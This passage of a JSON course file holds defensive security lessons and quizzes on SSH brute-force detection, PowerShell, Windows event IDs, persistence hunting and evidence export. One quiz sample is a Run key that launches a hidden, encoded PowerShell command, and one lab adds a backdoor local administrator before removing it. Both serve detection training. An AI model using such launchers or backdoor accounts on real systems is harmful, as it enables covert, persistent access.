+    "code": "import argparse, re, sys\nfrom collections import Counter\n\np = argparse.ArgumentParser(description=\"Find brute-force sources in an SSH log\")\np.add_argument(\"logfile\")\np.add_argument(\"--threshold\", type=int, default=3)\nargs = p.parse_args()\n\npattern = re.compile(r\"Failed password .* from (\\S+)\")\ncounts = Counter()\ntry:\n    with open(args.logfile, errors=\"replace\") as f:\n        for line in f:\n            m = pattern.search(line)\n            if m:\n                counts[m.group(1)] += 1\nexcept FileNotFoundError:\n    sys.exit(f\"No such file: {args.logfile}\")\n\nfor ip, n in counts.most_common():\n    if n >= args.threshold:\n        print(f\"{ip}: {n} failed logins\")"
+   },
+   "quiz": [
+    {
+     "d": 2,
+     "q": "Which part of the detector pulls the source IP out of each line?",
+     "o": [
+      "The capture group",
+      "The Counter object",
+      "The argparse module"
+     ],
+     "k": 0,
+     "w": "The capture group. `(\\S+)` after \"from \" captures the IP, and `.group(1)` returns it. Not the Counter: it counts the IPs after they're pulled out. Not argparse: it reads command-line arguments, not the log."
+    },
+    {
+     "d": 2,
+     "q": "Why compile the regex once with `re.compile` outside the loop?",
+     "o": [
+      "It's required for capture groups",
+      "It processes the pattern just once",
+      "It makes the regex case-insensitive"
+     ],
+     "k": 1,
+     "w": "It processes the pattern just once. Python caches patterns anyway, but compiling once is clearer and avoids repeated work on huge logs. Not case: compiling doesn't change how letters match. Not capture groups: they work without compiling."
+    },
+    {
+     "d": 3,
+     "q": "Which extension would best catch a successful brute-force attack?",
+     "o": [
+      "Print the log in colour",
+      "Sort the IPs alphabetically",
+      "Flag a success after failures"
+     ],
+     "k": 2,
+     "w": "Flag a success after failures. Many failures then a success from the same source is a classic sign that a password was guessed. Not colour or sorting: they change how results look, not what you detect."
+    }
+   ],
+   "challenge": {
+    "p": "For each IP with 3 or more failures, print `ALERT <ip> <count>`, like `ALERT 203.0.113.7 3`. Print nothing else.",
+    "start": "import re\nfrom collections import Counter\nLOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\npattern = re.compile(r\"Failed password .* from (\\S+)\")\ncounts = Counter()\nfor line in LOG.splitlines():\n    m = pattern.search(line)\n    if m:\n        counts[m.group(1)] += 1\n",
+    "hint": "Loop over `counts.items()` and print when `n >= 3`.",
+    "solution": "import re\nfrom collections import Counter\nLOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\npattern = re.compile(r\"Failed password .* from (\\S+)\")\ncounts = Counter()\nfor line in LOG.splitlines():\n    m = pattern.search(line)\n    if m:\n        counts[m.group(1)] += 1\nfor ip, n in counts.items():\n    if n >= 3:\n        print(\"ALERT\", ip, n)",
+    "expect": "ALERT 203.0.113.7 3"
+   },
+   "recap": [
+    "Plan the steps, then code each one.",
+    "Regex extracts, Counter counts, argparse configures.",
+    "Handle missing files cleanly.",
+    "Write it up on GitHub with sample output."
+   ]
+  },
+  {
+   "t": "PowerShell basics: cmdlets and the pipeline",
+   "sub": "Commands named like sentences, passing objects.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Cmdlet: a PowerShell command named Verb-Noun, such as Get-Process.\nPipeline: the | symbol, which passes one command's output to the next.\nObject: a structured item with named properties, such as a process with a Name and an Id."
+    ],
+    [
+     "Where these lessons run",
+     "These lessons use Windows PowerShell 5.1, which comes with Windows 10 and 11. No PowerShell here runs in this app. Run the commands in your Windows VM. These cmdlets are Windows-only, so they won't work in Kali."
+    ],
+    [
+     "Verb-Noun names",
+     "Every cmdlet is a verb and a noun, such as Get-Process or Stop-Service. Nouns are singular by convention. Guess a name, then check it with Get-Command.",
+     "Get-Command -Verb Get -Noun *Event*"
+    ],
+    [
+     "Get-Help",
+     "Get-Help explains a cmdlet. Add -Examples for ready-made examples. Run Update-Help once, as administrator, to download the full help files.",
+     "Get-Help Get-Process -Examples"
+    ],
+    [
+     "Objects, not text",
+     "The pipeline passes objects, not lines of text. So the next command can pick properties by name, with no text parsing. Get-Member lists an object's properties.",
+     "Get-Process | Get-Member -MemberType Properties"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "What does this sample command show?",
+     "code": "PS> Get-Process -Name notepad | Select-Object Name, Id",
+     "o": [
+      "Every property of the notepad process",
+      "Two columns: the Name and the Id",
+      "Only the process Id, as plain text"
+     ],
+     "k": 1,
+     "w": "Two columns: the Name and the Id. Select-Object keeps only the properties you list. Not every property: those are dropped. Not plain text: the output is still objects."
+    },
+    {
+     "d": 2,
+     "q": "Why can Sort-Object sort processes by CPU without any text parsing?",
+     "o": [
+      "It reads the text shown on screen",
+      "PowerShell turns output into CSV first",
+      "The pipeline passes objects with properties"
+     ],
+     "k": 2,
+     "w": "The pipeline passes objects with properties, so Sort-Object reads the CPU property directly. Not screen text or CSV: no conversion happens between commands."
+    },
+    {
+     "d": 1,
+     "q": "In this sample output, which process deserves a closer look?",
+     "code": "   Id ProcessName\n   -- -----------\n  944 svchost\n 4120 explorer\n 6632 svch0st",
+     "o": [
+      "944 svchost",
+      "4120 explorer",
+      "6632 svch0st"
+     ],
+     "k": 2,
+     "w": "6632 svch0st, with a zero instead of the letter o. Malware often copies a real process name with one character changed. Not svchost or explorer: both are normal Windows processes."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should list running services, but PowerShell says the term isn't recognised: `Get-Services | Where-Object Status -eq 'Running'`",
+    "hint": "Cmdlet nouns are normally singular.",
+    "solution": "`Get-Service | Where-Object Status -eq 'Running'`. The cmdlet is Get-Service. Get-Services doesn't exist, so PowerShell can't find it."
+   },
+   "tryit": {
+    "h": "Explore PowerShell in your VM",
+    "where": "Windows VM",
+    "p": "Open Windows PowerShell and run these one at a time. Compare the properties Get-Member lists with the columns Get-Process shows.",
+    "code": "$PSVersionTable.PSVersion\nGet-Command -Noun Process\nGet-Help Get-Process -Examples\nGet-Process | Get-Member -MemberType Properties",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Cmdlets are named Verb-Noun, with singular nouns.",
+    "Get-Help and Get-Command find what you need.",
+    "The pipeline passes objects, not text.",
+    "Run these lessons in your Windows VM, not this app."
+   ]
+  },
+  {
+   "t": "Filter, select, sort and group",
+   "sub": "Four cmdlets that turn noise into an answer.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Filter: keep only the items that match a test.\nProperty: a named value on an object, such as Status or CPU.\nGroup: items gathered by a shared value, with a count."
+    ],
+    [
+     "Where-Object filters",
+     "Where-Object keeps objects that match a test. Comparisons use -eq, -ne, -gt, -like (wildcards) and -match (patterns). Text comparisons ignore case by default.",
+     "Get-Service | Where-Object Status -eq 'Stopped'"
+    ],
+    [
+     "Select-Object picks",
+     "Select-Object keeps the properties you name. -First keeps only the first few objects.",
+     "Get-Process | Select-Object Name, Id, CPU -First 5"
+    ],
+    [
+     "Sort-Object orders",
+     "Sort-Object sorts smallest first. Add -Descending for largest first.",
+     "Get-Process | Sort-Object CPU -Descending |\n  Select-Object -First 5"
+    ],
+    [
+     "Group-Object counts",
+     "Group-Object gathers objects by a property and counts each group. It's the quickest way to spot one value that keeps repeating.",
+     "Get-Service | Group-Object Status"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "q": "What does this sample script show?",
+     "code": "# $logons holds four objects:\n#   kane Fail, admin Fail,\n#   admin Fail, kane Success\n$logons | Where-Object Result -eq 'Fail' |\n  Group-Object User |\n  Sort-Object Count -Descending |\n  Select-Object -First 1 Count, Name",
+     "o": [
+      "Count 1, Name kane",
+      "Count 2, Name admin",
+      "Count 3, Name Fail"
+     ],
+     "k": 1,
+     "w": "Count 2, Name admin. Three failures remain after the filter, grouped as admin 2 and kane 1. Sorting puts admin first. Not kane: it has one failure. Not Fail: the grouping is by User."
+    },
+    {
+     "d": 1,
+     "q": "How does -eq compare text in Where-Object?",
+     "o": [
+      "Ignoring case, by default",
+      "Matching case, by default",
+      "It only compares numbers"
+     ],
+     "k": 0,
+     "w": "Ignoring case, by default, so 'running' matches 'Running'. Not matching case: that's -ceq. Not only numbers: -eq works on text too."
+    },
+    {
+     "d": 1,
+     "q": "Failed logons grouped by source IP. Which source suggests brute force?",
+     "code": "Count Name\n----- ----\n    3 10.10.10.5\n  214 203.0.113.50\n    2 10.10.10.8",
+     "o": [
+      "10.10.10.5",
+      "203.0.113.50",
+      "10.10.10.8"
+     ],
+     "k": 1,
+     "w": "203.0.113.50, with 214 failures from one outside address. Not the other two: a few failures from internal addresses usually means mistyped passwords."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should list the 5 processes using the most CPU, but it shows the 5 using the least: `Get-Process | Sort-Object CPU | Select-Object -First 5`",
+    "hint": "Sort-Object sorts smallest first.",
+    "solution": "`Get-Process | Sort-Object CPU -Descending | Select-Object -First 5`. -Descending puts the largest values first."
+   },
+   "tryit": {
+    "h": "Count your services",
+    "where": "Windows VM",
+    "p": "Count services by status, then list stopped services that are set to start automatically.",
+    "code": "Get-Service | Group-Object Status\nGet-Service | Where-Object {\n  $_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'\n} | Select-Object Name, DisplayName",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Where-Object filters by a test.",
+    "Select-Object keeps the properties you name.",
+    "Sort-Object sorts smallest first unless you add -Descending.",
+    "Group-Object counts repeats, such as one IP failing many times."
+   ]
+  },
+  {
+   "t": "Reading event logs with Get-WinEvent",
+   "sub": "Filter at the source, not afterwards.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Event log: a Windows record of events, such as Security or System.\nEvent ID: the number for a type of event, such as 4625 for a failed logon.\nHashtable: a list of Name = value pairs inside @{ }, separated by semicolons."
+    ],
+    [
+     "Reading a log",
+     "Get-WinEvent reads Windows event logs. Reading the Security log needs an elevated PowerShell, opened with Run as administrator.",
+     "Get-WinEvent -LogName Security -MaxEvents 5"
+    ],
+    [
+     "Filter at the source",
+     "-FilterHashtable passes your filter to the Windows event log service. It sends back only matching events, which is much faster on a busy server.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddHours(-24)\n}"
+    ],
+    [
+     "Why not Where-Object",
+     "Piping to Where-Object reads every event first, then throws most of them away. On a server with millions of events, that can take minutes instead of seconds.",
+     "# Slow: reads everything first\nGet-WinEvent -LogName Security |\n  Where-Object Id -eq 4625"
+    ],
+    [
+     "No matches is an error",
+     "When nothing matches, Get-WinEvent shows the error \"No events were found that match the specified selection criteria\". In scripts, add -ErrorAction SilentlyContinue to hide it."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Why use -FilterHashtable instead of piping to Where-Object?",
+     "o": [
+      "It shows more columns",
+      "It filters before events reach PowerShell",
+      "It also reads logs from other computers"
+     ],
+     "k": 1,
+     "w": "It filters before events reach PowerShell, so only matches are sent back. Not more columns: the output is the same. Not other computers: that's the -ComputerName parameter."
+    },
+    {
+     "d": 2,
+     "q": "You run this in a normal, non-admin PowerShell window. What happens?",
+     "code": "PS> Get-WinEvent -LogName Security -MaxEvents 5",
+     "o": [
+      "It asks for a password",
+      "It returns an empty list",
+      "It shows an access error"
+     ],
+     "k": 2,
+     "w": "It shows an access error, because the Security log needs administrator rights. Not an empty list: PowerShell can't read the log at all. Not a password prompt: you need to open an elevated window."
+    },
+    {
+     "d": 2,
+     "q": "In this simplified sample output, which event most suggests someone covering their tracks?",
+     "code": "Time   Id   Message\n----   --   -------\n02:14 1102  The audit log was cleared.\n02:13 4732  A member was added to a group.\n02:13 4720  A user account was created.",
+     "o": [
+      "4720, the new account",
+      "4732, the group change",
+      "1102, the cleared log"
+     ],
+     "k": 2,
+     "w": "1102, the cleared log. Clearing the Security log destroys evidence. Not 4720 or 4732: they're worrying too, but they show what happened rather than hiding it."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. PowerShell rejects it: `Get-WinEvent -FilterHashtable @{LogName='Security', Id=4625}`",
+    "hint": "Look at what separates the pairs inside @{ }.",
+    "solution": "`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Pairs in a hashtable are separated by semicolons or new lines, not commas."
+   },
+   "tryit": {
+    "h": "Find your own failed logon",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Lock the screen and type a wrong password once, then sign in. Then find the failure.",
+    "code": "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddMinutes(-30)\n} | Select-Object TimeCreated, Id, Message -First 3",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-WinEvent reads Windows event logs.",
+    "The Security log needs an elevated PowerShell.",
+    "-FilterHashtable filters at the source, which is much faster.",
+    "Hashtable pairs are separated by semicolons."
+   ]
+  },
+  {
+   "t": "Failed and successful logons",
+   "sub": "4625, 4624, 4740 and the logon type.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Logon type: a number showing how someone logged on.\nAccount lockout: an account blocked after too many wrong passwords.\nProperties: the data fields inside an event, read by position."
+    ],
+    [
+     "The three IDs",
+     "4624 is a successful logon and 4625 is a failed one. 4740 means an account was locked out. For domain accounts, 4740 is recorded on a domain controller."
+    ],
+    [
+     "Logon types",
+     "Type 2 is at the keyboard, type 3 is over the network, such as a file share, and type 10 is Remote Desktop. With Network Level Authentication (NLA) on, failed Remote Desktop logons usually show as type 3."
+    ],
+    [
+     "Reading fields",
+     "Each event stores its data in Properties. In a 4625 event, position 5 is the account name, 10 is the logon type and 19 is the source IP address.",
+     "$e = Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625} -MaxEvents 1\n$e.Properties[5].Value    # account\n$e.Properties[19].Value   # source IP"
+    ],
+    [
+     "Group to spot brute force",
+     "Turn each failure into a small object, then group by account and IP. A big count for one pair is brute force. Many accounts from one IP is a password spray.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddHours(-1)} |\n  ForEach-Object { [pscustomobject]@{\n    User = $_.Properties[5].Value\n    IP   = $_.Properties[19].Value } } |\n  Group-Object User, IP |\n  Sort-Object Count -Descending"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "A successful 4624 logon shows logon type 10. How did the person log on?",
+     "o": [
+      "At the keyboard",
+      "Over Remote Desktop",
+      "Through a file share"
+     ],
+     "k": 1,
+     "w": "Over Remote Desktop: type 10 is RemoteInteractive. Not the keyboard: that's type 2. Not a file share: network logons are type 3."
+    },
+    {
+     "d": 2,
+     "q": "What does the top line of this sample output show?",
+     "code": "Count Name\n----- ----\n   48 admin, 203.0.113.50\n    3 kane, 10.10.10.5",
+     "o": [
+      "A password spray",
+      "A normal busy morning",
+      "Brute force on one account"
+     ],
+     "k": 2,
+     "w": "Brute force on one account: 48 failures for admin from one IP. Not a spray: that's a few tries across many accounts. Not normal: 48 failures in an hour from an outside address isn't routine."
+    },
+    {
+     "d": 2,
+     "q": "After those 48 failures, this appears. What does it most likely mean?",
+     "code": "Id   Account  LogonType  SourceIP\n--   -------  ---------  --------\n4624 admin    3          203.0.113.50",
+     "o": [
+      "The account was locked out",
+      "The attacker guessed the password",
+      "The firewall blocked the attacker"
+     ],
+     "k": 1,
+     "w": "The attacker guessed the password: a success from the same IP right after the failures. Not a lockout: that's 4740. Not blocked: 4624 means the logon worked."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It should find failed logons but returns nothing: `Get-WinEvent -FilterHashtable @{LogName='System'; Id=4625}`",
+    "hint": "Which log holds logon events?",
+    "solution": "`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}`. Logon events are in the Security log, not the System log."
+   },
+   "tryit": {
+    "h": "Catch your own brute force",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Create a lab account, fail its password a few times with runas, then group the failures. Delete the account afterwards.",
+    "code": "net user labuser 'L4b-Only-Passw0rd!' /add\n# Run this 3 times, typing a wrong password each time\nrunas /user:labuser cmd\nGet-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4625\n  StartTime=(Get-Date).AddMinutes(-10)} |\n  ForEach-Object { $_.Properties[5].Value } |\n  Group-Object\nnet user labuser /delete",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "4624 is success, 4625 is failure, 4740 is lockout.",
+    "Types: 2 keyboard, 3 network, 10 Remote Desktop.",
+    "Read fields from Properties by position.",
+    "Group by account and IP to spot brute force or spraying."
+   ]
+  },
+  {
+   "t": "Accounts and privilege",
+   "sub": "Who can do anything on this computer?",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Local administrator: an account with full control of one computer.\nPrivilege: a right to do something powerful, such as changing system settings.\nPersistence: a way an attacker keeps access, such as a new admin account."
+    ],
+    [
+     "Who is an administrator",
+     "Get-LocalGroupMember lists who is in a local group. Check the Administrators group first. Every extra member is another way to take over the computer.",
+     "Get-LocalGroupMember -Group Administrators"
+    ],
+    [
+     "New accounts: 4720",
+     "Event ID 4720 means a user account was created. An account created at night, by an account that doesn't normally manage users, needs checking."
+    ],
+    [
+     "Group changes: 4732",
+     "Event ID 4732 means someone was added to a security-enabled local group, such as Administrators. A 4720 followed by a 4732 is a classic way to create a backdoor admin."
+    ],
+    [
+     "Special privileges: 4672",
+     "Event ID 4672 is logged when an account with admin-level privileges logs on. It's noisy, because SYSTEM triggers it too. Filter out the built-in system accounts first."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Which event shows someone being added to the local Administrators group?",
+     "o": [
+      "4672",
+      "4720",
+      "4732"
+     ],
+     "k": 2,
+     "w": "4732, a member added to a security-enabled local group. Not 4720: that's an account being created. Not 4672: that's an admin-level logon."
+    },
+    {
+     "d": 2,
+     "q": "In this sample output, which entry needs checking first?",
+     "code": "ObjectClass Name                 PrincipalSource\n----------- ----                 ---------------\nUser        LAB-PC\\Administrator Local\nGroup       LAB\\Domain Admins    ActiveDirectory\nUser        LAB-PC\\support2      Local",
+     "o": [
+      "LAB-PC\\support2",
+      "LAB\\Domain Admins",
+      "LAB-PC\\Administrator"
+     ],
+     "k": 0,
+     "w": "LAB-PC\\support2, an unexpected local account with admin rights. Not the built-in Administrator or Domain Admins: both are normally in this group on a domain-joined computer."
+    },
+    {
+     "d": 2,
+     "q": "At 02:13, an unknown account triggers 4720, then 4732 adding the new account to Administrators. What's the likely aim?",
+     "o": [
+      "A routine password reset",
+      "Persistence with a backdoor admin",
+      "A Windows update installing"
+     ],
+     "k": 1,
+     "w": "Persistence with a backdoor admin. A new account made an admin at night keeps the attacker's access. Not a password reset: that's a different event. Not an update: updates don't create users."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. It fails because the group isn't found: `Get-LocalGroupMember -Group Administrator`",
+    "hint": "Check the exact group name.",
+    "solution": "`Get-LocalGroupMember -Group Administrators`. The built-in group is Administrators, plural. Administrator is the built-in user account."
+   },
+   "tryit": {
+    "h": "Make and spot a backdoor admin",
+    "where": "Windows VM, elevated PowerShell",
+    "p": "Create a test account, add it to Administrators, find events 4720 and 4732, then remove it.",
+    "code": "net user labadmin 'L4b-Only-Passw0rd!' /add\nnet localgroup Administrators labadmin /add\nGet-WinEvent -FilterHashtable @{\n  LogName='Security'; Id=4720,4732\n  StartTime=(Get-Date).AddMinutes(-10)} |\n  Select-Object TimeCreated, Id\nnet user labadmin /delete",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-LocalGroupMember shows who is an administrator.",
+    "4720: account created. 4732: added to a local group.",
+    "4720 then 4732 is a classic backdoor admin.",
+    "4672 is noisy: filter out system accounts."
+   ]
+  },
+  {
+   "t": "Persistence: services, tasks and Run keys",
+   "sub": "Where attackers hide so they survive a restart.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Service: a program Windows runs in the background, often from startup.\nScheduled task: a program Windows runs at set times or events.\nRun key: a registry location whose programs start when a user logs on.\nRegistry: Windows' database of settings."
+    ],
+    [
+     "Services and their paths",
+     "Get-CimInstance Win32_Service shows each service's PathName, the program it runs. Get-Service doesn't show it in PowerShell 5.1. A service running from a user or temp folder is suspicious.",
+     "Get-CimInstance Win32_Service |\n  Where-Object PathName -notmatch 'C:\\\\Windows\\\\' |\n  Select-Object Name, State, PathName"
+    ],
+    [
+     "New services: 7045",
+     "Event ID 7045 in the System log means a new service was installed. Attackers often install a service to run their tool with SYSTEM rights.",
+     "Get-WinEvent -FilterHashtable @{\n  LogName='System'; Id=7045}"
+    ],
+    [
+     "Scheduled tasks",
+     "Get-ScheduledTask lists tasks. Most live under \\Microsoft\\. Check the rest, and look at each task's Actions to see what it runs. Event ID 4698 logs task creation, but only if task auditing is turned on.",
+     "Get-ScheduledTask |\n  Where-Object TaskPath -notlike '\\Microsoft\\*' |\n  Select-Object TaskName, TaskPath, State"
+    ],
+    [
+     "Run keys and startup folders",
+     "Programs in Run keys start when a user logs on. Check the machine-wide key and each user's own key. Also check the Startup folders.",
+     "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "Which log holds Event ID 7045, a new service installed?",
+     "o": [
+      "System",
+      "Security",
+      "Application"
+     ],
+     "k": 0,
+     "w": "System. Service installs are logged by the Service Control Manager there. Not Security: that holds logons and account changes. Not Application: that's for app messages."
+    },
+    {
+     "d": 2,
+     "q": "In this sample Run key output, which entry is suspicious?",
+     "code": "OneDrive    : \"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background\nSecurityHealth : C:\\Windows\\system32\\SecurityHealthSystray.exe\nWinUpdate   : powershell -w hidden -nop -enc JABjAD0A...",
+     "o": [
+      "OneDrive",
+      "WinUpdate",
+      "SecurityHealth"
+     ],
+     "k": 1,
+     "w": "WinUpdate: a hidden PowerShell window running an encoded command, under a fake update name. Not OneDrive or SecurityHealth: both are normal Windows and Microsoft startup entries."
+    },
+    {
+     "d": 2,
+     "q": "In this sample service list, which path needs checking?",
+     "code": "Name      State   PathName\n----      -----   --------\nSpooler   Running C:\\Windows\\System32\\spoolsv.exe\nupdsvc    Running C:\\Users\\Public\\updsvc.exe\nwuauserv  Running C:\\Windows\\system32\\svchost.exe -k netsvcs",
+     "o": [
+      "Spooler",
+      "updsvc",
+      "wuauserv"
+     ],
+     "k": 1,
+     "w": "updsvc, running from C:\\Users\\Public, a folder any user can write to. Not Spooler or wuauserv: both are standard Windows services running from System32."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. The PathName column comes out empty in Windows PowerShell 5.1: `Get-Service | Select-Object Name, PathName`",
+    "hint": "Which command shows the program a service runs?",
+    "solution": "`Get-CimInstance Win32_Service | Select-Object Name, PathName`. In PowerShell 5.1, Get-Service objects have no PathName property. Win32_Service does."
+   },
+   "tryit": {
+    "h": "Hunt for persistence",
+    "where": "Windows VM",
+    "p": "List services outside C:\\Windows, non-Microsoft scheduled tasks and both Run keys. Note anything you can't explain, then look it up.",
+    "code": "Get-CimInstance Win32_Service |\n  Where-Object PathName -notmatch 'C:\\\\Windows\\\\' |\n  Select-Object Name, PathName\nGet-ScheduledTask | Where-Object TaskPath -notlike '\\Microsoft\\*'\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nGet-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Win32_Service shows the program each service runs.",
+    "7045 in the System log is a new service.",
+    "Check scheduled tasks outside \\Microsoft\\, and their actions.",
+    "Check both Run keys and the Startup folders."
+   ]
+  },
+  {
+   "t": "Processes and network connections",
+   "sub": "What's running, and who is it talking to?",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Process: a running program, with a process ID (PID).\nConnection: a network link between a local port and a remote address.\nOwningProcess: the PID of the program that owns a connection."
+    ],
+    [
+     "Get-Process",
+     "Get-Process lists running processes. The Path property shows where each program runs from. A familiar name in an odd folder is a warning sign.",
+     "Get-Process | Select-Object Id, Name, Path"
+    ],
+    [
+     "Connections and their owners",
+     "Get-NetTCPConnection lists TCP connections. OwningProcess is the PID behind each one. A calculated property can add the process name.",
+     "Get-NetTCPConnection -State Established |\n  Select-Object RemoteAddress, RemotePort, OwningProcess,\n    @{Name='Process'; Expression={\n      (Get-Process -Id $_.OwningProcess).Name }}"
+    ],
+    [
+     "Process creation: 4688",
+     "Event ID 4688 logs each new process. It's off by default. Turn on Audit Process Creation, plus the setting to include the command line, or the event won't show what was run."
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "q": "A connection shows OwningProcess 6632. How do you find which program it is?",
+     "o": [
+      "Get-Service -Id 6632",
+      "Get-Process -Id 6632",
+      "Get-WinEvent -Id 6632"
+     ],
+     "k": 1,
+     "w": "Get-Process -Id 6632, because OwningProcess is a process ID. Not Get-Service: it has no -Id parameter. Not Get-WinEvent: 6632 isn't an Event ID."
+    },
+    {
+     "d": 2,
+     "q": "In this sample output, which connection needs a closer look?",
+     "code": "RemoteAddress  RemotePort Process\n-------------  ---------- -------\n142.250.70.78         443 chrome\n198.51.100.23         443 powershell\n10.10.10.1            445 System",
+     "o": [
+      "chrome to 142.250.70.78",
+      "System to 10.10.10.1:445",
+      "powershell to 198.51.100.23"
+     ],
+     "k": 2,
+     "w": "powershell to 198.51.100.23: PowerShell holding a web connection to an unknown address can be a download or command channel. Not chrome: browsers make web connections. Not System on port 445: that's normal file sharing on the local network."
+    },
+    {
+     "d": 1,
+     "q": "You search for Event ID 4688 and find nothing at all. What's the most likely reason?",
+     "o": [
+      "No programs have started",
+      "4688 is in the System log",
+      "Process creation auditing is off"
+     ],
+     "k": 2,
+     "w": "Process creation auditing is off. It's off by default, so you have to turn it on. Not no programs: Windows starts processes constantly. Not the System log: 4688 is in the Security log."
+    }
+   ],
+   "challenge": {
+    "think": true,
+    "p": "Fix the command. The Process column is always empty: `Get-NetTCPConnection -State Listen | Select-Object LocalPort, Process`",
+    "hint": "Connections only carry a process ID. You have to look the name up.",
+    "solution": "`Get-NetTCPConnection -State Listen | Select-Object LocalPort, @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess).Name}}`. Connections have OwningProcess, not Process, so build the name with a calculated property."
+   },
+   "tryit": {
+    "h": "Who is your VM talking to?",
+    "where": "Windows VM",
+    "p": "List established connections with their process names. Open a website, then run it again and spot the new browser connections.",
+    "code": "Get-NetTCPConnection -State Established |\n  Select-Object RemoteAddress, RemotePort,\n    @{Name='Process'; Expression={\n      (Get-Process -Id $_.OwningProcess).Name }} |\n  Sort-Object Process",
+    "warn": "Take a snapshot of your VM first. Lab only: never run these on a work or personal computer."
+   },
+   "recap": [
+    "Get-Process shows what's running, and Path shows where from.",
+    "Get-NetTCPConnection shows connections and their owning PID.",
+    "Look the PID up with Get-Process -Id.",
+    "4688 needs process creation auditing turned on."
+   ]
+  },
+  {
+   "t": "Exporting evidence",
+   "sub": "Save what you found so others can trust it.",
+   "lang": "ps",
+   "learn": [
+    [
+     "Key terms",
+     "Evidence: data you collect to show what happened.\nUTC: Coordinated Universal Time, a time zone that never changes for daylight saving.\nHash: a fingerprint of a file. If the file changes, the hash changes."
+    ],
+    [
+     "Export-Csv",
+     "Export-Csv saves objects as a spreadsheet file. In Windows PowerShell 5.1, add -NoTypeInformation, or the first line will be a #TYPE line that breaks some tools.",
+     "Get-Process | Select-Object Id, Name, Path |\n  Export-Csv C:\\Evidence\\processes.csv -NoTypeInformation"
+    ],
+    [
+     "ConvertTo-Json",
+     "ConvertTo-Json keeps nested data. Its default depth is 2, so deeper data is flattened into text. Set -Depth higher for complex objects.",
+     "Get-NetTCPConnection |\n  ConvertTo-Json -Depth 3 |\n  Set-Content C:\\Evidence\\connections.json"
+    ],
+    [
+     "Record times in UTC",
+     "Write timestamps in UTC so evidence from different computers lines up, even across daylight saving changes. Format \"o\" gives a standard timestamp with its offset.",
+     "(Get-Date).ToUniversalTime().ToString('o')"
+    ],
+    [
+     "Hash what you collect",
+     "Get-FileHash records a SHA-256 fingerprint of each evidence file. Write it in your notes. Anyone can rerun it later to show the file hasn't changed.",
+     "Get-FileHash C:\\Evidence\\processes.csv -Algorithm SHA256"
+    ]
+   ],
+   "quiz": [
+    {
+     "d": 2,
+     "q": "In Windows PowerShell 5.1, what's the first line of this sample file?",
